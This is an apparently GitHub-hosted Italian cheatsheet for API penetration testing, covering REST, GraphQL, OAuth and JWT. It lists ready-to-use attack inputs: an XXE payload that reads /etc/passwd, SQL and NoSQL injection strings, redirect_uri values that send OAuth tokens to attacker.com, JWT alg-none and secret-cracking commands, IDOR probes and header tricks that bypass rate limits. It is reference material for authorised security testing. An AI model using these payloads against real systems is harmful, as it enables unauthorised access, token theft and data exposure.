# 🔌 API Security Testing Cheatsheet

```
    █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
   ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
   ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
   ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
   ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
   ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```
<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

## 📋 Tabella dei Contenuti

* [OWASP API Top 10](#-owasp-api-top-10)
* [REST API Testing](#-rest-api-testing)
* [GraphQL Testing](#-graphql-testing)
* [Attacchi all'Autenticazione](#-attacchi-allautenticazione)
* [Attacchi JWT](#-attacchi-jwt)
* [Vulnerabilità Comuni](#-vulnerabilità-comuni)

---

## 🔴 OWASP API Top 10

| # | Vulnerabilità | Descrizione |
| --- | --- | --- |
| 1 | **BOLA** | Broken Object Level Authorization (Autorizzazione a livello di oggetto) |
| 2 | **Broken Authentication** | Debolezze nei meccanismi di autenticazione |
| 3 | **BOPLA** | Broken Object Property Level Auth (Autorizzazione proprietà oggetto) |
| 4 | **Consumo di Risorse Illimitato** | Mancanza di rate limiting |
| 5 | **BFLA** | Broken Function Level Authorization (Autorizzazione livello funzione) |
| 6 | **SSRF** | Server-Side Request Forgery |
| 7 | **Security Misconfiguration** | Errori di configurazione e default insicuri |
| 8 | **Lack of Protection** | Mancanza di protezione contro flussi automatizzati |
| 9 | **Improper Assets Management** | Gestione impropria degli asset (API vecchie/ombra) |
| 10 | **Unsafe API Consumption** | Consumo non sicuro di API di terze parti |

---

## 🌐 REST API Testing

### Discovery & Enumerazione

```bash
# Trova gli endpoint delle API
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Enumerazione delle versioni
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Percorsi comuni
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### Testing dei Metodi HTTP

```bash
# Test di tutti i metodi
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# Override del metodo
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Manipolazione dei Parametri

```bash
# BOLA/IDOR
GET /api/users/1      # Il tuo ID
GET /api/users/2      # ID di un altro utente
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Parameter pollution
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Bypass tramite encoding
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Attacchi Content-Type

```bash
# Cambiare il Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE via Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Mass Assignment

```bash
# Aggiunta di campi extra
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Prova ad aggiungere
  "isAdmin": true,           # Prova ad aggiungere
  "balance": 99999,          # Prova ad aggiungere
  "verified": true           # Prova ad aggiungere
}

# Utilizzo di array
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

## 📊 GraphQL Testing

### Introspezione

```graphql
# Query di introspezione completa
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Introspezione semplice
{__schema{types{name,fields{name}}}}

# Ottenere tutte le query
{__schema{queryType{fields{name,description}}}}

# Ottenere tutte le mutation
{__schema{mutationType{fields{name,description}}}}
```

### Attacchi Comuni

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Attacco di Batching
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# DoS tramite query nidificate
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Suggerimenti dei campi (Field suggestions)
{ user { a }  # Suggerirà i campi validi
```

### SQL Injection in GraphQL

```graphql
# SQLi negli argomenti
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# NoSQL injection
query { user(query: "{$gt: ''}") { id } }
```

### Bypass Introspezione Disabilitata

```graphql
# Introspezione alternativa
query { __type(name: "User") { fields { name } } }

# Brute-force dei campi con ffuf
# Utilizzare una wordlist di nomi di campi GraphQL comuni
```

---

## 🔐 Attacchi all'Autenticazione

### Testing API Key

```bash
# Trovare le API key
# Controllare file JS, app mobile, GitHub

# Testare la chiave in diversi punti
curl -H "X-API-Key: CHIAVE" https://api.target.com
curl -H "Authorization: Bearer CHIAVE" https://api.target.com
curl -H "api-key: CHIAVE" https://api.target.com
curl "https://api.target.com?api_key=CHIAVE"
```

### Attacchi OAuth/OAuth2

```bash
# Furto del token via redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Bypass del parametro state
# Rimuovere il parametro state
# Usare lo stesso state per utenti diversi

# Leak del token
# Controllare l'header Referer per fughe di token
```

### Gestione delle Sessioni

```bash
# Enumerazione dei token
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# I vecchi token sono ancora validi dopo il logout?
# Problemi di rotazione del token
# Riuso del token tra sessioni diverse
```

---

## 🎫 Attacchi JWT

### Decodificare JWT

```bash
# Online: jwt.io
# CLI
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Confusione dell'Algoritmo

```bash
# Cambiare alg in "none"
{
  "alg": "none",
  "typ": "JWT"
}
# Rimuovere la firma

# Attacco HS256 → RS256
# Usare la chiave pubblica come segreto HMAC
```

### Bypass della Firma

```bash
# Rimuovere la firma (mantenendo i punti)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Brute-force di segreti deboli
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Segreti deboli comuni
secret
password
123456
your-256-bit-secret
```

### Manipolazione dei Claim

```javascript
// Cambiare i claim dell'utente
{
  "sub": "1234567890",
  "name": "admin",        // Cambia in admin
  "role": "admin",        // Escalation dei privilegi
  "admin": true,          // Aggiungi flag admin
  "exp": 9999999999       // Estendi la scadenza
}
```

### Strumenti JWT

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T     # Tamper (Manomissione)
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Crack

# jwtcrack
./jwtcrack <JWT>
```

---

## 🐛 Vulnerabilità Comuni

### Bypass del Rate Limiting

```bash
# Header da provare
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Cambio case (maiuscole/minuscole)
X-FORWARDED-FOR: 127.0.0.1

# Null byte
X-Forwarded-For: 127.0.0.1%00

# Endpoint differenti
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA (Broken Object Level Authorization)

```bash
# Test manipolazione ID
GET /api/orders/123    # Il tuo ordine
GET /api/orders/124    # L'ordine di qualcun altro

# Guessing di UUID
# Controllare pattern prevedibili
# Provare ID sequenziali o basati su timestamp

# ID in formati differenti
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA (Broken Function Level Authorization)

```bash
# Accedere a endpoint admin come utente regolare
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Basato sul metodo
GET /api/users     # Consentito
POST /api/users    # Dovrebbe essere solo per admin?
DELETE /api/users  # Dovrebbe essere solo per admin?
```

### Gestione Impropria degli Asset

```bash
# Vecchie versioni delle API
/api/v1/users    # Potrebbe avere più vulnerabilità
/api/v2/users    # Versione corrente
/api/v3/users    # Beta/non rilasciata

# Endpoint di sviluppo
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ Strumenti

| Strumento | Scopo |
| --- | --- |
| **Burp Suite** | Intercettazione e testing API |
| **Postman** | Esplorazione API |
| **Insomnia** | Client REST/GraphQL |
| **graphql-voyager** | Visualizzazione GraphQL |
| **jwt_tool** | Testing JWT |
| **Arjun** | Discovery dei parametri |

---

## 📚 Risorse

* [OWASP API Security Top 10](https://owasp.org/API-Security/)
* [GraphQL Voyager](https://apis.guru/graphql-voyager/)
* [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Proteggi le tue API!</b>
  <i>Solo per scopi di testing autorizzati!</i>
</p>
